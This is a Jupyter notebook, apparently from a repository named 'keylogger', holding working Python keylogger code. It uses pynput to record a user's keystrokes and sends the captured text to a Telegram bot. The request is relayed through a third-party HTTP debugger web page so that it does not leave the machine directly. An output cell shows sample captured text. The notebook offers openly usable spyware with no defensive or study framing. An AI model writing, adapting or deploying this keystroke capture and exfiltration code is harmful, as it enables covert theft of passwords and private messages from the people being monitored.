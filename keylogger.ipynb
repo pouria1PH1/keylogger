{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dependecies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import telegram\n",
    "import requests\n",
    "from pynput.keyboard import Key\n",
    "from pynput import keyboard\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "token_bot=\"your token bot\"\n",
    "bot = telegram.Bot(token=token_bot)\n",
    "chat_id=\"your chat id in telegram \"\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "snd msg with   http debugger:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "url=f\"https://api.telegram.org/bot{token_bot}/sendMessage?chat_id={chat_id}&text=test\""
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "def keylogger  :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "import requests\n",
    "\n",
    "# Define a variable to store the current word being typed\n",
    "current_word = ''\n",
    "index = 0\n",
    "\n",
    "\n",
    "# Define a callback function to handle the key press event\n",
    "def on_press(key):\n",
    "    global current_word, index\n",
    "    \n",
    "    try:\n",
    "        # Check if the key pressed is a letter or space\n",
    "        if str(key).find(\"space\") > 0:\n",
    "            current_word += \" \"\n",
    "            \n",
    "           \n",
    "        \n",
    "    \n",
    "\n",
    "        \n",
    "        \n",
    "        if key.char.isalpha():\n",
    "            current_word += key.char\n",
    "    \n",
    "        index+=1\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass\n",
    "    \n",
    "    # Send HTTP request and update current_word\n",
    "\n",
    "\n",
    "# Define a callback function to handle the key release event\n",
    "def on_release(key):\n",
    "    try:\n",
    "        if key == keyboard.Key.esc:\n",
    "            # Stop the listener\n",
    "            return False\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "# Create a keyboard listener and attach the callback functions\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    # Start the listener\n",
    "    listener.join()\n",
    "\n",
    "\n",
    "\n",
    "url = f\"https://api.telegram.org/bot{token_bot}/sendMessage?chat_id={chat_id}&text={current_word}\"\n",
    "mydict = {\n",
    "        \"urlbox\": url,\n",
    "        \"AgentBox\": \"Google Chrome\",\n",
    "        \"VersionList\": \"HTTP/1.1\",\n",
    "        \"MethodList\": \"GET\"\n",
    "    }\n",
    "    \n",
    "http = requests.post(\"https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx\", data=mydict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'salam  backspace   backspace   backspace   backspace   backspace ali'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "current_word"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
